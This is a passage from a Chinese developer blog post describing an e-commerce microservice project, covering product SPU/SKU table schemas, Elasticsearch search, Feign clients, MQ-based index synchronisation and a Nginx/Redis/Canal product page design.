<li><code>dir</code>：要上传到bucket中的哪个目录</li>
</ul>
<p>使用HmacSHA256签名,用户申请后授权微服务将这个发给客户端,客户端将这个和图片发给阿里云,阿里云验证后就可以上传了.阿里服务器将我们的用我们的私钥然后用同样的算法算出签名来验证.</p>
<h1 id="商品设计"><a href="#商品设计" class="headerlink" title="商品设计"></a>商品设计</h1><h2 id="商品规格参数设计"><a href="#商品规格参数设计" class="headerlink" title="商品规格参数设计"></a>商品规格参数设计</h2><p>商品规格表tb_spec_param</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `tb_spec_param` (</span><br><span class="line">  `id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="string">&#x27;主键&#x27;</span>,</span><br><span class="line">  `category_id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;商品分类id&#x27;</span>,</span><br><span class="line">  `group_id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;规格参数所属的组id&#x27;</span>,</span><br><span class="line">  `name` <span class="type">varchar</span>(<span class="number">128</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;参数名&#x27;</span>,</span><br><span class="line">  `<span class="type">numeric</span>` tinyint(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;是否是数字类型参数，true或false&#x27;</span>,</span><br><span class="line">  `unit` <span class="type">varchar</span>(<span class="number">64</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span> COMMENT <span class="string">&#x27;数字类型参数的单位，非数字类型可以为空&#x27;</span>,</span><br><span class="line">  `generic` tinyint(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;是否是sku通用属性，true或false&#x27;</span>,</span><br><span class="line">  `searching` tinyint(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;是否用于搜索过滤，true或false&#x27;</span>,</span><br><span class="line">  `segments` <span class="type">varchar</span>(<span class="number">1024</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span> COMMENT <span class="string">&#x27;数值类型参数，如果需要搜索，则添加分段间隔值，如CPU频率区间：0.5-1.0,1.1~1.5&#x27;</span>,</span><br><span class="line">  `options` <span class="type">varchar</span>(<span class="number">1024</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span> COMMENT <span class="string">&#x27;参数的可选值，不允许用户自己填值&#x27;</span>,</span><br><span class="line">  `create_time` <span class="type">timestamp</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span>,</span><br><span class="line">  `update_time` <span class="type">timestamp</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> <span class="keyword">ON</span> <span class="keyword">UPDATE</span> <span class="built_in">CURRENT_TIMESTAMP</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`),</span><br><span class="line">  KEY `key_group` (`group_id`),</span><br><span class="line">  KEY `key_category` (`category_id`)</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB AUTO_INCREMENT<span class="operator">=</span><span class="number">42</span> <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8 COMMENT<span class="operator">=</span><span class="string">&#x27;规格参数组下的参数名&#x27;</span>;</span><br></pre></td></tr></table></figure>



<p>规格组表tb_spec_group,一个规格组对应多个规格参数,一对多关系,在规格参数中持有规格组的id;</p>
<p>generic是否是sku通用属性,例如颜色,内存等; </p>
<h2 id="商品设计-1"><a href="#商品设计-1" class="headerlink" title="商品设计"></a>商品设计</h2><p>SPU: Standard product Unit(标准产品单位),一组具有共同属性的商品集;</p>
<p>SKU: Stock Keeping Unit(库存量单位), Spu商品集因具体特性不同而细分的每个商品</p>
<p>一个SPU包含多个SKU; SPU是一个抽象的商品集概念,为了方便后台管理; SKU才是具体要销售的商品,每一个SKU的价格、库存可能会不一样,用户购买的是SKU而不是SPU</p>
<h3 id="为什么需要分SPU和SKU"><a href="#为什么需要分SPU和SKU" class="headerlink" title="为什么需要分SPU和SKU?"></a>为什么需要分SPU和SKU?</h3><p>不同的SKU的属性大部分都是一样的,如果只有sku表,那么每个Sku都保存自己的一份数据,将会有大量的数据重复,而且不方便后期的维护和管理.</p>
<p>SPU:一组SKU的共性数据;SKU:每个SKU的特有数据</p>
<p>tb_spu</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `tb_spu` (</span><br><span class="line">  `id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="string">&#x27;spu id&#x27;</span>,</span><br><span class="line">  `name` <span class="type">varchar</span>(<span class="number">256</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span> COMMENT <span class="string">&#x27;商品名称&#x27;</span>,</span><br><span class="line">  `title` <span class="type">varchar</span>(<span class="number">256</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span> COMMENT <span class="string">&#x27;商品标签,搜索关键字信息&#x27;</span>,</span><br><span class="line">  `cid1` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;1级类目id&#x27;</span>,</span><br><span class="line">  `cid2` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;2级类目id&#x27;</span>,</span><br><span class="line">  `cid3` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;3级类目id&#x27;</span>,</span><br><span class="line">  `brand_id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;商品所属品牌id&#x27;</span>,</span><br><span class="line">  `saleable` tinyint(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;1&#x27;</span> COMMENT <span class="string">&#x27;是否上架，0下架，1上架&#x27;</span>,</span><br><span class="line">  `create_time` <span class="type">timestamp</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="string">&#x27;添加时间&#x27;</span>,</span><br><span class="line">  `update_time` <span class="type">timestamp</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> <span class="keyword">ON</span> <span class="keyword">UPDATE</span> <span class="built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="string">&#x27;最后修改时间&#x27;</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`)</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB AUTO_INCREMENT<span class="operator">=</span><span class="number">190</span> <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8 COMMENT<span class="operator">=</span><span class="string">&#x27;spu表;</span></span><br></pre></td></tr></table></figure>

<p>我们做了表的垂直拆分, tb_spu_detail</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `tb_spu_detail` (</span><br><span class="line">  `spu_id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;商品spu的id，与spu表一对一&#x27;</span>,</span><br><span class="line">  `description` text COMMENT <span class="string">&#x27;商品描述信息&#x27;</span>,</span><br><span class="line">  `specification` <span class="type">varchar</span>(<span class="number">1024</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span> COMMENT <span class="string">&#x27;规格参数值&#x27;</span>,</span><br><span class="line">  `packing_list` <span class="type">varchar</span>(<span class="number">1024</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span> COMMENT <span class="string">&#x27;包装清单&#x27;</span>,</span><br><span class="line">  `after_service` <span class="type">varchar</span>(<span class="number">1024</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span> COMMENT <span class="string">&#x27;售后服务&#x27;</span>,</span><br><span class="line">  `create_time` <span class="type">timestamp</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span>,</span><br><span class="line">  `update_time` <span class="type">timestamp</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> <span class="keyword">ON</span> <span class="keyword">UPDATE</span> <span class="built_in">CURRENT_TIMESTAMP</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`spu_id`)</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8;</span><br></pre></td></tr></table></figure>

<p>这张表的数据都比较大,为了不影响主表的查询效率我们拆分出这张表.</p>
<p>需要注意的字段是<code>specification</code>字段，其中保存的是该商品对应的规格参数值。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;1&quot;</span><span class="punctuation">:</span> <span class="string">&quot;OPPO&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;2&quot;</span><span class="punctuation">:</span> <span class="string">&quot;V20&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;3&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2018&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;5&quot;</span><span class="punctuation">:</span> <span class="string">&quot;189&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;6&quot;</span><span class="punctuation">:</span> <span class="string">&quot;陶瓷&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;7&quot;</span><span class="punctuation">:</span> <span class="string">&quot;安卓&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;8&quot;</span><span class="punctuation">:</span> <span class="string">&quot;骁龙&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;9&quot;</span><span class="punctuation">:</span> <span class="string">&quot;骁龙970&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;10&quot;</span><span class="punctuation">:</span> <span class="string">&quot;6&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;11&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;14&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5.5&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;15&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2180*1280&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;16&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1200&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;17&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2000&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;18&quot;</span><span class="punctuation">:</span> <span class="string">&quot;3250&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;4&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;炫丽红&quot;</span><span class="punctuation">,</span> <span class="string">&quot;极夜黑&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;12&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;4GB&quot;</span><span class="punctuation">,</span> <span class="string">&quot;6GB&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;13&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;64GB&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="SKU数据结构"><a href="#SKU数据结构" class="headerlink" title="SKU数据结构"></a>SKU数据结构</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `tb_sku` (</span><br><span class="line">  `id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="string">&#x27;主键&#x27;</span>,</span><br><span class="line">  `spu_id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;spu表的id&#x27;</span>,</span><br><span class="line">  `title` <span class="type">varchar</span>(<span class="number">1024</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span> COMMENT <span class="string">&#x27;商品sku的标题&#x27;</span>,</span><br><span class="line">  `images` <span class="type">varchar</span>(<span class="number">1024</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span> COMMENT <span class="string">&#x27;商品的图片，多个图片以‘,’分割&#x27;</span>,</span><br><span class="line">  `stock` <span class="type">int</span>(<span class="number">8</span>) unsigned <span class="keyword">DEFAULT</span> <span class="string">&#x27;9999&#x27;</span> COMMENT <span class="string">&#x27;库存&#x27;</span>,</span><br><span class="line">  `price` <span class="type">bigint</span>(<span class="number">16</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;0&#x27;</span> COMMENT <span class="string">&#x27;销售价格，单位为分&#x27;</span>,</span><br><span class="line">  `indexes` <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span> COMMENT <span class="string">&#x27;属性下标&#x27;</span>,</span><br><span class="line">  `sold` <span class="type">bigint</span>(<span class="number">20</span>) unsigned <span class="keyword">DEFAULT</span> <span class="string">&#x27;0&#x27;</span> COMMENT <span class="string">&#x27;销量&#x27;</span>,</span><br><span class="line">  `special_spec` <span class="type">varchar</span>(<span class="number">1024</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span> COMMENT <span class="string">&#x27;sku的特有规格参数键值对，json格式&#x27;</span>,</span><br><span class="line">  `saleable` tinyint(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;1&#x27;</span> COMMENT <span class="string">&#x27;是否上架，0下架，1上架&#x27;</span>,</span><br><span class="line">  `create_time` <span class="type">timestamp</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="string">&#x27;添加时间&#x27;</span>,</span><br><span class="line">  `update_time` <span class="type">timestamp</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> <span class="keyword">ON</span> <span class="keyword">UPDATE</span> <span class="built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="string">&#x27;最后修改时间&#x27;</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`),</span><br><span class="line">  KEY `key_spu_id` (`spu_id`) <span class="keyword">USING</span> BTREE</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB AUTO_INCREMENT<span class="operator">=</span><span class="number">27359021573</span> <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8 COMMENT<span class="operator">=</span><span class="string">&#x27;sku表,该表表示具体的商品实体,如黑色的 64g的iphone 8&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022660.png" alt="image-20210414212628094"></p>
<h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><p>numeric是mysql的关键字,需要加上@TableField(“`numeric`“);</p>
<h1 id="Elasticsearch"><a href="#Elasticsearch" class="headerlink" title="Elasticsearch"></a>Elasticsearch</h1><p>门户系统面向的是用户，安全性很重要，而且搜索引擎对于单页应用并不友好。因此我们的门户系统不再采用与后台系统类似的SPA（单页应用）。</p>
<p>依然是前后端分离，不过前端的页面会使用独立的html，在每个页面中使用vue来做页面渲染。</p>
<h2 id="索引库数据结构"><a href="#索引库数据结构" class="headerlink" title="索引库数据结构"></a>索引库数据结构</h2><p>我们存入elasticsearch的数据包含spu、sku、spuDetail等信息,必须组织成一个实体,然后写入.</p>
<p>搜索的需求主要包括：</p>
<ul>
<li>用来参与搜索的数据<br>标题、分类、品牌、规格参数、销量、价格、更新时间、评价</li>
<li>用来参与展示的数据<br>图片、价格、标题、销量、商品id</li>
</ul>
<h2 id="接入Feign客户端"><a href="#接入Feign客户端" class="headerlink" title="接入Feign客户端"></a>接入Feign客户端</h2><p>构建Goods是需要的数据都来自于商品微服务,主要包括下面的查询功能:</p>
<ul>
<li>批量查询Spu</li>
<li>查询Spu包含的Sku</li>
<li>查询Spu的规格参数键值对信息</li>
</ul>
<p>商品微服务需要对外提供这样的接口,我们在其他微服务才可以调用. 而远程调用需要通过Feign完成,因此我们要在ly-item-api项目中,编写Feign客户端.</p>
<p>Feign的原理</p>
<p>对http请求的伪装</p>
<p>需要知道：localhost:8081&#x2F;goods&#x2F;spu&#x2F;page?page&#x3D;1</p>
<p>主机和端口：通过@FeignClient(“item-service”)得到服务名称，去eureka根据服务名称拉取服务列表</p>
<p>请求方式： @GetMapping请求路径：@GetMapping(“&#x2F;goods&#x2F;spu&#x2F;page”)</p>
<p>请求参数：@RequestParam(value &#x3D; “page”, defaultValue &#x3D; “1”) Integer page</p>
<p>返回值类型：响应体的类型</p>
<h3 id="在ly-item提供Feign客户端"><a href="#在ly-item提供Feign客户端" class="headerlink" title="在ly-item提供Feign客户端"></a>在ly-item提供Feign客户端</h3><p>在于<code>ly-item-api</code>中创建包：<code>com.leyou.item.client</code>，然后创建<code>ItemClient</code>接口</p>
<h3 id="在ly-search引入Feign客户端"><a href="#在ly-search引入Feign客户端" class="headerlink" title="在ly-search引入Feign客户端"></a>在ly-search引入Feign客户端</h3><h4 id="引入依赖"><a href="#引入依赖" class="headerlink" title="引入依赖"></a>引入依赖</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-openfeign<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.leyou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ly-item-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="启动FeignClient"><a href="#启动FeignClient" class="headerlink" title="启动FeignClient"></a>启动FeignClient</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableFeignClients(basePackages = &quot;com.leyou.item.client&quot;)</span></span><br></pre></td></tr></table></figure>

<h3 id="完成数据导入"><a href="#完成数据导入" class="headerlink" title="完成数据导入"></a>完成数据导入</h3><h2 id="搜索框补全"><a href="#搜索框补全" class="headerlink" title="搜索框补全"></a>搜索框补全</h2><p>要实现这个功能，大概流程是这样的：</p>
<ul>
<li>页面发请求到服务端，携带用户输入的关键字</li>
<li>服务端根据关键字查询elasticsearch，得到自动补全的提示信息</li>
<li>服务端返回信息到页面，在页面完成渲染</li>
</ul>
<p>绑定了键盘事件，同时使用<code>v-model</code>关联了一个变量：<code>key</code>.</p>
<p>而在下面的键盘对应的事件里，我们会判断用户按下的键，如果是字母数字这样的按钮，就会去调用<code>getSuggestion()</code>方法，查询提示内容; 每当用户按下对应按键，输入文字，就会触发，发送请求到服务端;</p>
<p>现在，页面请求已经发出了，接下来就可以再服务端接收，并且去Elasticsearch查询了;</p>
<h3 id="自动补全模版"><a href="#自动补全模版" class="headerlink" title="自动补全模版"></a>自动补全模版</h3><p>我们服务端要做的事情包括：</p>
<ul>
<li>接收前端请求，获取补全的prefix参数</li>
<li>去ES查询，获取补全的内容<ul>
<li>先在ES中定义自动补全的查询模板</li>
<li>java代码中调用查询模板，获取补全结果</li>
</ul>
</li>
<li>返回到页面</li>
</ul>
<h2 id="基本搜索"><a href="#基本搜索" class="headerlink" title="基本搜索"></a>基本搜索</h2><p>给用户提示信息后，接下来用户就会去搜索数据了，大概的实现步骤是这样的：</p>
<ul>
<li>用户点击提示的内容或自己输入内容点击搜索</li>
<li>页面跳转到搜索列表页，并携带搜索关键字</li>
<li>搜索列表页发起请求到服务端，携带搜索参数</li>
<li>服务端利用搜索关键字，向ElasticSearch发起请求，查询数据</li>
<li>返回数据到页面，完成渲染</li>
</ul>
<h2 id="数据同步"><a href="#数据同步" class="headerlink" title="数据同步"></a>数据同步</h2><p>商品上架:在索引库新增数据; 商品下架: 把数据从索引库删除;</p>
<p>商品的上架和下架时商品微服务<code>ly-item</code>中处理的，索引库数据是在<code>ly-search</code>中处理的。我们如何在上架时修改索引库呢？</p>
<p>这里有两种解决方案：</p>
<ul>
<li><p>方案1：在商品微服务的上下架业务后，加入修改索引库数据</p>
</li>
<li><p>方案2：搜索服务对外提供操作索引库，商品微服务在商品上下架后，调用接口。</p>
</li>
</ul>
<p>以上两种方式都有同一个严重问题：就是代码耦合，后台服务中需要嵌入搜索和商品页面服务，违背了微服务的<code>独立</code>原则，而且严重违背了开闭原则。</p>
<p>所以，我们会通过另外一种方式来解决这个问题：消息队列</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022661.png" alt="image-20210414230406233"></p>
<p>商品微服务在完成上架、下架后，发送消息到MQ，通知是哪个商品更新了，自己的业务就结束了，商品微服务不需要知道，也不关心到底是谁在监听这条消息。</p>
<p>搜索微服务在接收到消息后，更新索引库数据即可，同样不需要关心别人。</p>
<p>两个微服务之间没有直接调用，没有业务的耦合。</p>
<p>不过，这里有几个问题需要思考：</p>
<ul>
<li><p>什么时候发消息？</p>
<ul>
<li>当商品服务对商品进行上下架的时候，需要发送一条消息，通知其它服务</li>
</ul>
</li>
<li><p>商品微服务发送消息的内容是什么？</p>
<ul>
<li>对商品的增删改时其它服务可能需要新的商品数据，但是如果消息内容中包含全部商品信息，数据量太大，而且并不是每个服务都需要全部的信息。因此我们<strong>只发送商品id</strong>，其它服务可以根据id查询自己需要的信息。</li>
</ul>
</li>
<li><p>搜索微服务接收消息后如何处理？</p>
<ul>
<li>上架：添加新的数据到索引库</li>
<li>下架：删除索引库数据</li>
</ul>
</li>
</ul>
<h3 id="消息队列常量"><a href="#消息队列常量" class="headerlink" title="消息队列常量"></a>消息队列常量</h3><p>在<code>ly-common</code>的<code>com.leyou.common.constants</code>包中编写一个常量类，记录将来会用到的Exchange名称、Queue名称、routing_key名称.</p>
<h1 id="WebFlux"><a href="#WebFlux" class="headerlink" title="WebFlux"></a>WebFlux</h1><h1 id="商品详情页"><a href="#商品详情页" class="headerlink" title="商品详情页"></a>商品详情页</h1><h2 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h2><p>用户搜索到商品后，就会点击商品，查看商品详情内容，就会访问到商品详情页。商品详情页是展示商品详细信息的一个页面，承载在网站的大部分流量和订单的入口。</p>
<p>因此，商品详情页必须能够应对高并发的压力。那么如何才能实现一个满足千万级并发量的商品详情页面呢？</p>
<p>接下来，我们就一起分析下商品详情页的设计思路。</p>
<h2 id="传统模式"><a href="#传统模式" class="headerlink" title="传统模式"></a>传统模式</h2><p>首先，来看下传统模式下，一个页面的加载和渲染过程：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022662.png" alt="image-20200310173422202"></p>
<p>基本流程如下：</p>
<ul>
<li>用户请求Nginx服务，获取到静态页面</li>
<li>然后页面发起ajax，向Tomcat服务获取数据</li>
<li>Tomcat查询数据库</li>
<li>页面渲染</li>
</ul>
<p>这种模式下，数据库成为了瓶颈，高并发情况下，数据库难以支撑，因此我们可能会在服务之前加入缓存，减小数据库压力：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022663.png" alt="image-20200310173700012"></p>
<p>此时，整个服务的并发能力，就受限于Tomcat了，业务经常受到依赖的服务不稳定而导致的性能抖动。</p>
<h2 id="静态化页面"><a href="#静态化页面" class="headerlink" title="静态化页面"></a>静态化页面</h2><p>为了解决上述问题，就有了页面静态化方案，如图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022664.png" alt="image-20200310174506082"></p>
<p>基本流程：</p>
<ul>
<li>商品修改发送消息到MQ</li>
<li>微服务监听MQ，得知商品变化，渲染并生成一个静态页面</li>
<li>用户请求Nginx</li>
<li>Nginx直接返回渲染好的静态Html</li>
</ul>
<p>优点：</p>
<ul>
<li>用户请求渲染好的Html，响应速度快</li>
<li>通过MQ异步更新，保证数据同步</li>
</ul>
<p>缺陷：</p>
<ul>
<li>小部分数据如价格变更，整个静态页都要重新生成</li>
<li>随着商品数量增加，页面会越来越多</li>
<li>页面模板变更，所有商品的静态页都要重新生成，非常困难</li>
</ul>
<h2 id="动态模板，静态化数据"><a href="#动态模板，静态化数据" class="headerlink" title="动态模板，静态化数据"></a>动态模板，静态化数据</h2><p>我们要解决的问题：</p>
<ul>
<li>能迅速响瞬变的需求，和各种变态需求；</li>
<li>支持各种垂直化页面改版；</li>
<li>页面模块化；</li>
<li>高性能、水平扩容；</li>
</ul>
<p>怎么办？</p>
<ul>
<li>如何做到动态响应需求变化，页面变化？<ul>
<li>将页面模板动态化，需要的数据静态化</li>
</ul>
</li>
<li>如何避免整个页面的全量更新？<ul>
<li>我们把页面分成几部分：如顶部面包屑、商品SKU展示、商品描述、商品评论等，形成多个页面模板（模块）。对应的数据也分成几部分，这些数据可能来自不同的微服务。这样可以减少因局部变更引起的整个页面重新生成。</li>
</ul>
</li>
<li>如何应对Tomcat的并发能力低问题？<ul>
<li>将模板渲染、数据放到nginx中做，利用nginx的高并发能力提高系统吞吐量</li>
</ul>
</li>
<li>如何实现数据静态化？<ul>
<li>需要的数据可以缓存在Nginx的本地共享词典中（长期不会修改的数据），如果命中则直接渲染并返回。如果未命中，则查询Redis集群，获取数据。如果Redis集群依然未命中，再去查询后台微服务，由微服务获取数据，然后写入缓存中，保证下次Nginx可以从缓存中拿到数据。这样可以减少服务端压力。</li>
</ul>
</li>
<li>如何保证数据一致性？<ul>
<li>为了保证Redis数据与数据库数据一致，我们还要用到Canal技术，监听数据库变化，及时更新Redis数据。</li>
</ul>
</li>
</ul>
<p>流程图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022665.png" alt="image-20210324234942982"></p>
<p>因此，我们需要做的事情包括：</p>
<ul>
<li>静态页数据服务：一个收集商品相关数据，并更新Redis缓存的数据服务</li>
<li>Nginx服务：接收用户请求，查询模板数据，利用模板渲染商品页面</li>
<li>Canal服务：监听数据库变化，同步通知静态页数据服务，更新Redis数据</li>
</ul>
<h2 id="缓存数据同步"><a href="#缓存数据同步" class="headerlink" title="缓存数据同步"></a>缓存数据同步</h2><p>当商品、分类、品牌、规格等数据改变时，Redis中数据也必须同步改变，如何做到呢？</p>
<p>这里我们会采用Canal这个框架来实现</p>
<h3 id="什么是Canal"><a href="#什么是Canal" class="headerlink" title="什么是Canal"></a>什么是Canal</h3><p>**canal [kə’næl]**，译意为水道&#x2F;管道&#x2F;沟渠，canal是阿里巴巴旗下的一款开源项目，基于Java开发。基于数据库增量日志解析，提供增量数据订阅&amp;消费。</p>
<p>基于日志增量订阅和消费的业务包括</p>
<ul>
<li>数据库镜像</li>
<li>数据库实时备份</li>
<li>索引构建和实时维护(拆分异构索引、倒排索引等)</li>
<li>业务 cache 刷新</li>
<li>带业务逻辑的增量数据处理</li>
</ul>
